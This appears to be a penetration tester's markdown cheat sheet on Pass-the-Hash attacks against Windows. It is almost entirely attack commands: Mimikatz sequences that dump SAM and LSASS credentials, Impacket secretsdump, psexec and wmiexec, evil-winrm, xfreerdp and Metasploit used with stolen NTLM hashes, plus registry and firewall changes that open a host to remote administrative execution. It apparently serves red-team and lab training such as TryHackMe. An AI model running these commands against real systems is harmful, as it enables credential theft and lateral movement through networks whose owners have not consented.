# Pass the Hash


Pass the hash technique allow an attacker to authenticate to a remote system or service using a user's NTLM hash instead of plain-text password.

**Does not work for Kerberos Authentication**

PsExec requires access to the special administrative share named `Admin$`, thus also local administrative rights. There many tools for performing a similar to legitimate use of connecting with [[SMB]]. [[Metasploit]] has:
```bash
post/windows/gather/hashdump
exploit/windows/smb/psexec
```

Another method:
```bash
pth-winexe -U $username%$NT:$LM //$ip cmd
```

[[Impacket-Cheatsheet]] with:
```bash
# Dump secrets for more ntlm
secretsdump.py $user@$ip -hashes $ntml
# Laterally move 
# Beware the requirements of PsExec
psexec -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
# Requires port 445 for SMBv3 to be open on $targetIP
impacket-wmiexec -hashes :$NTpartofTheHash Administrator@$targetIP
```

Or login with [[evil-winrm-Cheatsheet]] using  `-H` 
```bash
evil-winrm -i $ip -u $user -H $ntml
```

[[RDP]] with `xfreerdp` with:
```bash
xfreerdp /v:$IP /u:DOMAIN\\Administrator /pth:$ntml
```

With [[Mimikatz-Cheatsheet]]
```powershell
privilege::debug
token::elevate
# Dump the SAM
lsadump::sam 
# Extract NTLM hashes from LSASS memory
sekurlsa::msv
# Revert Token to then use the hash from the above command's output
token::revert
sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:"<cmds goes here>"
```


[[Sysinternals]] to move laterally. **Beware** - `PsExec.exe` ([[Sysinternals-Psexec]])  writes `psexecsvc.exe` to `C;\Windows` of a remote machine to create and spawn service then run `$cmd` as a child process of `psexecsvc.exe`. 
```powershell
# $user MUST be a part of the Administrators lcoal group
# ADMIN$ share must be avalilable 
# File and Printer sharing must be ON!
.\PsExec64.exe -i  \\$ComputerName -u $domain\$user -p '$password' $cmd
```


#### Enabling PsExec requirements

Enable `ADMIN$` share 
```powershell
# With net commands
net share ADMIN$ 
# Remove share
net share ADMIN$ /delete


# With the registry - Requires Reboot 
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
# pwsh registery interaction
New-ItemProperty -Name AutoShareWks -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters -Type DWORD -Value 0
# Reboot Reboot!
shutdown /r /t 0
```

`Netsh` to control File and Printer Sharing - [elevenforum](https://www.elevenforum.com/t/turn-on-or-off-file-and-printer-sharing-in-windows-11.4579/)
```
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes

netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=No
```

In an Administrative PowerShell session - [elevenforum](https://www.elevenforum.com/t/turn-on-or-off-file-and-printer-sharing-in-windows-11.4579/)
```powershell
# Turn on File and Printer Sharing
# 
# Apply to all network profiles
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Profile Any​
# Apply to "Domain" network profile
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Profile Domain
# Apply to "Private" network profile
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Profile Private
# Apply to "Public" network profile
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True -Profile Public
# Turn off File and Printer Sharing
# 
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled False -Profile Any​
# Apply to "Domain" network profile
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled False -Profile Domain
# Apply to "Private" network profile
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled False -Profile Private
# Apply to "Public" network profile
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled False -Profile Public
```
## Reference

[THM Lateral movement and pivoting](https://tryhackme.com/room/lateralmovementandpivoting)
[Ippsec.rocks](https://ippsec.rocks/?#)